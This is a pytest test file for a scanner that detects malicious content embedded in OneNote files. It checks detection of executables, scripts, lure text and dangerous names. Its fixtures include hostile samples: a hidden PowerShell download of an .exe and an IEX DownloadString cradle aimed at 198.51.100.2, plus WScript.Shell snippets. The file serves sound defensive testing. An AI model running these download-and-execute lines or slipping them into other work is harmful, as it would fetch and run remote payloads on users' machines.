from __future__ import annotations

import random
import struct
import time

import pytest

from centinela.analyzers.onenote import OneNoteAnalyzer, scan_onenote
from centinela.core.models import Artifact, Severity
from tests.analyzers_docs._samples import FDSO_HEADER, ONENOTE_HEADER, fake_pe, onenote_blob
from tests.helpers import make_artifact

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 200
HTA = b'<html><head><hta:application id="x"/><script language="VBScript">Set s = CreateObject("WScript.Shell")</script></head></html>'
BAT = b'@echo off\r\nstart /b powershell -w hidden -c "iwr http://198.51.100.2/a -o %TEMP%\\a.exe"\r\n'
VBS = b'On Error Resume Next\r\nSet o = CreateObject("WScript.Shell")\r\no.Run "calc", 0\r\n'
PS1 = b"$u='http://198.51.100.2/a'; IEX (New-Object Net.WebClient).DownloadString($u)\n"
LNK = b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 120


@pytest.fixture
def analyzer(settings):
    return OneNoteAnalyzer(settings)


async def run(analyzer, make_ctx, data, filename="Factura.one", detected_type="onenote"):
    art = make_artifact(data, filename, detected_type)
    findings = await analyzer.analyze(make_ctx(), art)
    rules = [f.rule for f in findings]
    assert len(rules) == len(set(rules))
    for f in findings:
        assert f.analyzer == "onenote" and f.rule.startswith("onenote.")
        assert f.title and f.description
    return {f.rule: f for f in findings}


def test_accepts(analyzer):
    assert analyzer.accepts(make_artifact(b"x", "a.bin", "onenote"))
    assert analyzer.accepts(make_artifact(b"x", "a.one", "unknown"))
    assert not analyzer.accepts(make_artifact(b"MZ", "a.one", "pe"))
    assert not analyzer.accepts(make_artifact(b"x", "a.docx", "ooxml"))


async def test_listing_only_entries_are_skipped(analyzer, make_ctx):
    # "pedido.one" visto dentro de un zip cifrado: lo marca filetype por el nombre, acá no hay qué abrir
    listed = Artifact(id="att0/pedido.one", filename="pedido.one", size=9000, depth=1, parent_id="att0",
                      listing_only=True)  # fmt: skip
    assert not analyzer.accepts(listed)
    assert await analyzer.analyze(make_ctx(), listed) == []
    weird = make_artifact(onenote_blob([fake_pe()]), "a.one", "onenote").model_copy(
        update={"listing_only": True}
    )
    assert not analyzer.accepts(weird)
    assert await analyzer.analyze(make_ctx(), weird) == []


async def test_embedded_pe_with_lure(analyzer, make_ctx):
    data = onenote_blob([PNG, fake_pe()], names=("Factura_0045.exe",), lure="DOUBLE CLICK TO VIEW FILE")
    res = await run(analyzer, make_ctx, data)
    f = res["onenote.embedded_pe"]
    assert f.severity == Severity.HIGH and f.score == 90  # 85 + texto señuelo
    assert "Factura_0045.exe" in f.evidence["nombres_incrustados"]
    assert f.evidence["textos_señuelo"]
    assert f.evidence["payloads"][0]["tipo"] == "pe"
    assert "2023" in f.description
    assert res["onenote.embedded_image"].severity == Severity.INFO
    assert "onenote.file" not in res


@pytest.mark.parametrize(
    ("payload", "kind"), [(HTA, "hta"), (BAT, "bat"), (VBS, "vbs"), (PS1, "ps1"), (LNK, "lnk")]
)
async def test_embedded_scripts(analyzer, make_ctx, payload, kind):
    res = await run(analyzer, make_ctx, onenote_blob([PNG, payload]))
    f = res["onenote.embedded_script"]
    assert f.severity == Severity.HIGH and f.score == 80
    assert f.evidence["payloads"][0]["tipo"] == kind


async def test_images_only_is_low(analyzer, make_ctx):
    res = await run(analyzer, make_ctx, onenote_blob([PNG, PNG + b"x"]))
    assert set(res) == {"onenote.embedded_image", "onenote.file"}
    assert res["onenote.file"].severity == Severity.LOW


async def test_document_payload_is_medium(analyzer, make_ctx):
    res = await run(analyzer, make_ctx, onenote_blob([b"%PDF-1.7\n" + b"x" * 100]))
    assert res["onenote.embedded_file"].severity == Severity.MEDIUM


async def test_dangerous_name_without_recognizable_payload(analyzer, make_ctx):
    xored = bytes(b ^ 0x5A for b in fake_pe())
    res = await run(analyzer, make_ctx, onenote_blob([xored], names=("update.hta",)))
    f = res["onenote.dangerous_filename"]
    assert f.severity == Severity.HIGH
    assert f.evidence["nombres_incrustados"] == ["update.hta"]


async def test_benign_names_are_not_flagged(analyzer, make_ctx):
    res = await run(analyzer, make_ctx, onenote_blob([PNG], names=("Notas de reunion.docx", "logo.png")))
    assert "onenote.dangerous_filename" not in res
    assert all(f.severity <= Severity.LOW for f in res.values())


# --------------------------------------------------------------------------- entradas hostiles


async def test_truncated_object_with_huge_length(analyzer, make_ctx):
    data = (
        ONENOTE_HEADER + b"\x00" * 100 + FDSO_HEADER + struct.pack("<QIQ", 2**63, 0, 0) + b"MZ" + b"\x00" * 50
    )
    res = await run(analyzer, make_ctx, data)
    f = res["onenote.embedded_pe"]
    assert f.evidence["payloads"][0]["truncado"] is True


async def test_header_at_end_of_file(analyzer, make_ctx):
    data = ONENOTE_HEADER + b"\x00" * 10 + FDSO_HEADER + b"\x01\x02"
    res = await run(analyzer, make_ctx, data)
    assert all(f.severity <= Severity.LOW for f in res.values())


def test_many_objects_are_capped():
    data = ONENOTE_HEADER + (FDSO_HEADER + struct.pack("<QIQ", 4, 0, 0) + PNG[:4] + FDSO_HEADER[:0]) * 5000
    t0 = time.perf_counter()
    scan = scan_onenote(data)
    assert time.perf_counter() - t0 < 10
    assert len(scan.payloads) == 200


async def test_random_garbage(analyzer, make_ctx):
    data = random.Random(11).randbytes(100_000)
    res = await run(analyzer, make_ctx, data, "x.one", "unknown")
    assert res == {}


def test_payload_containing_header_guid_is_skipped():
    # un payload que contiene el GUID de cabecera no debe generar un objeto "fantasma"
    inner = b"MZ" + b"\x00" * 30 + FDSO_HEADER + struct.pack("<QIQ", 10, 0, 0) + b"0123456789"
    scan = scan_onenote(onenote_blob([inner]))
    assert len(scan.payloads) == 1
    assert scan.payloads[0].kind == "pe"
